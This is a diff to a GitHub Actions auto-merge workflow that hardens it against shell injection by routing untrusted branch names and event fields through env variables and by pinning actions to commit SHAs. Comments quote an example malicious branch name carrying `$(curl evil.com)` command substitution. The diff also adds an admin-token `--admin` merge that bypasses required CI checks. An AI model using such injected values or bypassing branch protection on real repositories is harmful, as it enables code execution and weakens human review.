@@ -1,5 +1,5 @@
 name: "Impl: Merge"
-run-name: "Merge: ${{ github.event.inputs.pr_number || github.event.pull_request.head.ref }}"
+run-name: "Merge: PR #${{ github.event.inputs.pr_number || github.event.pull_request.number }}"
 
 # Auto-merge implementation PRs when ai-approved label is added
 # Creates per-library metadata file and promotes GCS images
@@ -13,6 +13,10 @@ on:
         description: 'PR number to auto-merge'
         required: true
         type: number
+
+concurrency:
+  group: impl-merge-${{ github.event.inputs.pr_number || github.event.pull_request.number || github.ref }}
+  cancel-in-progress: false
 
 jobs:
   merge:
@@ -29,17 +33,28 @@ jobs:
         id: check
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Untrusted event fields routed through env: so they cannot reach
+          # the shell as command substitution. A branch named e.g.
+          # `implementation/foo/$(curl evil.com)` would have been executed
+          # when assigned via direct ${{ }} interpolation.
+          EVENT_NAME: ${{ github.event_name }}
+          EVENT_ACTION: ${{ github.event.action }}
+          EVENT_LABEL: ${{ github.event.label.name }}
+          EVENT_PR_BRANCH: ${{ github.event.pull_request.head.ref }}
+          EVENT_PR_NUMBER: ${{ github.event.pull_request.number }}
+          INPUT_PR_NUMBER: ${{ github.event.inputs.pr_number }}
+          GH_REPO: ${{ github.repository }}
         run: |
-          if [[ "${{ github.event_name }}" == "workflow_dispatch" ]]; then
-            PR_NUM="${{ github.event.inputs.pr_number }}"
-            PR_DATA=$(gh pr view "$PR_NUM" --repo ${{ github.repository }} --json headRefName,labels)
+          if [[ "$EVENT_NAME" == "workflow_dispatch" ]]; then
+            PR_NUM="$INPUT_PR_NUMBER"
+            PR_DATA=$(gh pr view "$PR_NUM" --repo "$GH_REPO" --json headRefName,labels)
             BRANCH=$(echo "$PR_DATA" | jq -r '.headRefName')
             HAS_APPROVED=$(echo "$PR_DATA" | jq -r '[.labels[].name] | any(. == "ai-approved")')
           else
-            ACTION="${{ github.event.action }}"
-            LABEL="${{ github.event.label.name }}"
-            BRANCH="${{ github.event.pull_request.head.ref }}"
-            PR_NUM="${{ github.event.pull_request.number }}"
+            ACTION="$EVENT_ACTION"
+            LABEL="$EVENT_LABEL"
+            BRANCH="$EVENT_PR_BRANCH"
+            PR_NUM="$EVENT_PR_NUMBER"
 
             if [[ "$ACTION" != "labeled" || "$LABEL" != "ai-approved" ]]; then
               echo "should_run=false" >> $GITHUB_OUTPUT
@@ -67,15 +82,20 @@ jobs:
 
       - name: Checkout repository
         if: steps.check.outputs.should_run == 'true'
-        uses: actions/checkout@v6
+        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6
         with:
           fetch-depth: 0
 
       - name: Extract info from branch
         if: steps.check.outputs.should_run == 'true'
         id: extract
+        env:
+          # Route the (still-untrusted) branch name through env: rather than
+          # `${{ … }}` interpolation in the run body — otherwise a branch like
+          # `implementation/foo/$(curl evil.com)` would be re-interpreted as
+          # a shell command substitution at the assignment site.
+          BRANCH: ${{ steps.check.outputs.branch }}
         run: |
-          BRANCH="${{ steps.check.outputs.branch }}"
           # Format: implementation/{specification-id}/{library}
           SPEC_ID=$(echo "$BRANCH" | cut -d'/' -f2)
           LIBRARY=$(echo "$BRANCH" | cut -d'/' -f3)
@@ -149,28 +169,51 @@ jobs:
         if: steps.check.outputs.should_run == 'true'
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ steps.check.outputs.pr_number }}
+          REPOSITORY: ${{ github.repository }}
         run: |
-          gh api repos/${{ github.repository }}/issues/${{ steps.check.outputs.pr_number }}/reactions \
+          gh api repos/$REPOSITORY/issues/$PR_NUMBER/reactions \
             -f content=rocket
 
       - name: Merge PR to main (with retry)
         if: steps.check.outputs.should_run == 'true'
         env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # ADMIN_TOKEN: PAT with admin scope from a repo-admin user, used so
+          # that `gh pr merge --admin` can bypass the main-branch ruleset
+          # (required-status-checks). Falls back to GITHUB_TOKEN if not set so
+          # the workflow still runs and fails with a clear ruleset error
+          # instead of an opaque auth error.
+          GH_TOKEN: ${{ secrets.ADMIN_TOKEN || secrets.GITHUB_TOKEN }}
+          PR_NUM: ${{ steps.check.outputs.pr_number }}
+          REPOSITORY: ${{ github.repository }}
+          HAS_ADMIN_TOKEN: ${{ secrets.ADMIN_TOKEN != '' }}
         run: |
-          PR_NUM="${{ steps.check.outputs.pr_number }}"
+          if [ "$HAS_ADMIN_TOKEN" != "true" ]; then
+            echo "::warning::ADMIN_TOKEN secret is not set — merge will fail if main ruleset enforces required status checks. Add a fine-grained PAT with Contents:Write + Pull requests:Write + Administration:Read+Write as repo secret ADMIN_TOKEN."
+          fi
+
           MAX_ATTEMPTS=5
 
           for attempt in $(seq 1 $MAX_ATTEMPTS); do
             echo "::notice::Merge attempt $attempt/$MAX_ATTEMPTS"
 
             # Update branch before merge attempt
-            gh pr update-branch "$PR_NUM" --repo ${{ github.repository }} 2>/dev/null || true
+            gh pr update-branch "$PR_NUM" --repo "$REPOSITORY" 2>/dev/null || true
             sleep 2
 
+            # --admin bypasses the branch ruleset's required-status-check
+            # gate. Required because impl-generate.yml pushes via GITHUB_TOKEN,
+            # which by GitHub's anti-recursion design does not trigger
+            # downstream CI workflows (Run Linting / Run Tests / Run Frontend
+            # Tests), so impl PRs never get those checks. The pipeline already
+            # gates merge behind the AI quality review threshold.
+            #
+            # Bypass only works if the token has admin role. GITHUB_TOKEN is
+            # only `write`, so a repo-admin PAT is required (ADMIN_TOKEN).
             if gh pr merge "$PR_NUM" \
-              --repo ${{ github.repository }} \
+              --repo "$REPOSITORY" \
               --squash \
+              --admin \
               --delete-branch; then
               echo "::notice::Merge successful on attempt $attempt"
               exit 0
@@ -191,14 +234,14 @@ jobs:
 
       - name: Authenticate to GCP
         if: steps.check.outputs.should_run == 'true'
-        uses: google-github-actions/auth@v3
+        uses: google-github-actions/auth@7c6bc770dae815cd3e89ee6cdf493a5fab2cc093  # v3
         with:
           project_id: anyplot
           workload_identity_provider: ${{ secrets.GCP_WORKLOAD_IDENTITY_PROVIDER }}
 
       - name: Set up Cloud SDK
         if: steps.check.outputs.should_run == 'true'
-        uses: google-github-actions/setup-gcloud@v3
+        uses: google-github-actions/setup-gcloud@aa5489c8933f4cc7a4f7d45035b3b1440c9c10db  # v3
 
       - name: Promote GCS images to production
         if: steps.check.outputs.should_run == 'true'
